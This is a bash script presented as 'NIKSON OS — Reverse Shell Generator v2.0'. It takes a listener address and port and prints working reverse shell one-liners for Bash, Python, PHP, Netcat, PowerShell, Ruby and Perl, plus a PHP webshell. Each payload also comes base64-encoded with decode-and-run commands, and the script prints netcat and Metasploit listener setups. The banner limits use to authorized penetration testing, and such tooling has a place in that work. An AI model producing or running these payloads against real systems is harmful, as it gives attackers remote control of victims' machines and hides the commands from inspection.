RED='\033[0;31m'
GREEN='\033[0;32m'
LGREEN='\033[1;32m'
CYAN='\033[0;36m'
LCYAN='\033[1;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

banner() {
    clear
    echo -e "${LGREEN}${BOLD}"
    cat << 'BANNER'
  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗
  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝
  NIKSON OS — Reverse Shell Generator v2.0
BANNER
    echo -e "${NC}"
    echo -e "  ${RED}${BOLD}[!] FOR AUTHORIZED PENETRATION TESTING ONLY${NC}"
    echo -e "  ${DIM}Unauthorized use is illegal under IT Act 2000${NC}\n"
}

section() {
    echo -e "\n${CYAN}──────────────────────────────────────────────${NC}"
    echo -e "  ${LGREEN}${BOLD}▶ $1${NC}"
    echo -e "${CYAN}──────────────────────────────────────────────${NC}\n"
}

# ── Print payload with base64 ──────────────────────────────
print_payload() {
    local NAME="$1"
    local CMD="$2"
    local B64
    B64=$(echo -n "$CMD" | base64 -w 0)

    echo -e "  ${YELLOW}${BOLD}[$NAME]${NC}"
    echo -e "  ${GREEN}$CMD${NC}"
    echo ""
    echo -e "  ${YELLOW}${BOLD}[$NAME — Base64]${NC}"
    echo -e "  ${LCYAN}$B64${NC}"
    echo ""

    # OS specific decode+run command
    echo -e "  ${DIM}Linux/Mac decode & run:${NC}"
    echo -e "  ${GREEN}echo '$B64' | base64 -d | bash${NC}"
    echo ""
    echo -e "  ${DIM}Windows PowerShell decode & run:${NC}"
    local PSB64
    PSB64=$(echo -n "$CMD" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0)
    echo -e "  ${GREEN}powershell -EncodedCommand $PSB64${NC}"
    echo -e "  ${DIM}────────────────────────────────────────${NC}\n"
}

generate() {
    local LHOST="$1"
    local LPORT="$2"
    local TYPE="$3"
    local OS_TYPE="$4"

    section "Payloads — $LHOST:$LPORT  [Target OS: $OS_TYPE]"

    case $TYPE in
        1) # Bash
            print_payload "BASH" \
                "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
            print_payload "BASH FIFO" \
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
            ;;
        2) # Python
            print_payload "PYTHON3" \
                "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
            print_payload "PYTHON2" \
                "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            ;;
        3) # PHP
            print_payload "PHP" \
                "php -r '\$s=fsockopen(\"$LHOST\",$LPORT);\$p=proc_open(\"/bin/sh\",array(\$s,\$s,\$s),\$pipes);'"
            print_payload "PHP WEBSHELL" \
                "<?php system(\$_GET['cmd']); ?>"
            ;;
        4) # Netcat
            print_payload "NETCAT" \
                "nc -e /bin/bash $LHOST $LPORT"
            print_payload "NETCAT (no -e)" \
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
            ;;
        5) # PowerShell
            local PS_CMD="\$client=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}"
            print_payload "POWERSHELL" "powershell -nop -c \"$PS_CMD\""
            ;;
        6) # Ruby
            print_payload "RUBY" \
                "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$LHOST\",\"$LPORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
            ;;
        7) # Perl
            print_payload "PERL" \
                "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
            ;;
        8) # All
            for i in 1 2 3 4 5 6 7; do
                generate "$LHOST" "$LPORT" "$i" "$OS_TYPE"
            done
            return
            ;;
    esac

    # Listener
    section "Listener — Run on YOUR machine"
    echo -e "  ${YELLOW}${BOLD}[NETCAT]${NC}"
    echo -e "  ${LGREEN}nc -lvnp $LPORT${NC}\n"
    echo -e "  ${YELLOW}${BOLD}[METASPLOIT]${NC}"
    echo -e "  ${GREEN}use exploit/multi/handler"
    echo -e "  set PAYLOAD generic/shell_reverse_tcp"
    echo -e "  set LHOST $LHOST"
    echo -e "  set LPORT $LPORT"
    echo -e "  run${NC}\n"
}

main() {
    banner

    # LHOST
    DEFAULT_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
    echo -e "  ${CYAN}Your IP: ${LGREEN}${DEFAULT_IP}${NC}"
    read -p "  LHOST [$DEFAULT_IP]: " LHOST
    LHOST="${LHOST:-$DEFAULT_IP}"

    # LPORT
    read -p "  LPORT [4444]: " LPORT
    LPORT="${LPORT:-4444}"
    if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then
        echo -e "${RED}Invalid port!${NC}"; exit 1
    fi

    # Target OS
    echo -e "\n  ${YELLOW}${BOLD}Target OS:${NC}\n"
    echo -e "  ${CYAN}1)${NC} Linux / Mac"
    echo -e "  ${CYAN}2)${NC} Windows"
    echo -e "  ${CYAN}3)${NC} Any / Unknown"
    read -p "  Choice [3]: " OS_CHOICE
    case ${OS_CHOICE:-3} in
        1) OS_TYPE="Linux/Mac" ;;
        2) OS_TYPE="Windows" ;;
        *) OS_TYPE="Any" ;;
    esac

    # Payload type
    echo -e "\n  ${YELLOW}${BOLD}Payload type:${NC}\n"
    echo -e "  ${CYAN}1)${NC} Bash"
    echo -e "  ${CYAN}2)${NC} Python"
    echo -e "  ${CYAN}3)${NC} PHP"
    echo -e "  ${CYAN}4)${NC} Netcat"
    echo -e "  ${CYAN}5)${NC} PowerShell (Windows)"
    echo -e "  ${CYAN}6)${NC} Ruby"
    echo -e "  ${CYAN}7)${NC} Perl"
    echo -e "  ${CYAN}8)${NC} ALL"
    echo -e "  ${CYAN}q)${NC} Quit"
    echo ""
    read -p "  Choice: " CHOICE

    [[ "$CHOICE" == "q" ]] && exit 0
    [[ "$CHOICE" =~ ^[1-8]$ ]] && generate "$LHOST" "$LPORT" "$CHOICE" "$OS_TYPE" || \
        echo -e "${RED}Invalid!${NC}"
}

main "$@"
